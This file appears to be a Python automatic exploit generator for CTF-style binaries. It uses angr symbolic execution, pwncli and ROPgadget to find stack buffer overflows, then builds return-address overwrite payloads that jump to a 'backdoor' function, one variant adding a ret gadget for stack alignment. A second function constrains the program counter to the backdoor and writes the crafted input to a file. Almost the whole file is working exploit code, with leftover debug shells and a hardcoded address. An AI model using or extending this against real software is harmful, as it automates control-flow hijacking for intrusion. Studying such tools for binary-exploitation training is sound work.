import angr
import subprocess
from pwncli import *
log = logging.getLogger(__name__)


def retaddr(binary_path,command):
    process = subprocess.Popen(['ROPgadget', '--binary',binary_path,'--only',command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    res = stdout.decode()
    return int(res.split('\n')[2].split(' ')[0],16)


def exploit(binary_path,overflow_list,backdoor):
    proj=angr.Project(binary_path)
    for overflow in overflow_list:
        state = proj.factory.entry_state()
        simgr = proj.factory.simgr(state)
        simgr.explore(find=overflow['addr'])
        inp = simgr.found[0].posix.dumps(0)
        payload = []
        payload.append(inp+b'a'*overflow['buf_size']+p64_ex(0xdeadbeef)+p64_ex(backdoor[0]['fcn_addr']))
        ret = retaddr(binary_path,'ret')
        payload.append(inp+b'a'*overflow['buf_size']+p64_ex(0xdeadbeef)+p64_ex(ret)+p64_ex(backdoor[0]['fcn_addr']))
    return payload
    # import IPython
    # IPython.embed()

def exploit_dynamic(ep:angr.SimState,backdoor):
    Newep=ep.copy()
    if ep.satisfiable(extra_constraints=([ep.regs.pc == backdoor[0]['fcn_addr']])):
        ep.add_constraints(ep.regs.pc == backdoor[0]['fcn_addr'])
        log.info("[+] RIP can point to backdoor")
        # stack is not aligned
        if ep.regs.rsp.args[0] % 0x10 == 0:
            # Newep.satisfiable(extra_constraints=([ep.regs.pc == 0x4005C5,memory == backdoor[0]['fcn_addr']]))
            memory = Newep.memory.load(Newep.regs.rsp.args[0], 64)
            Newep.add_constraints(memory == backdoor[0]['fcn_addr'])
            Newep.add_constraints(ep.regs.pc == 0x4005C5)
            import IPython
            IPython.embed()
            print(Newep.posix.dumps(0))
        with open("exp", 'wb') as f:
            f.write(ep.posix.dumps(0))

    # import IPython
    # IPython.embed()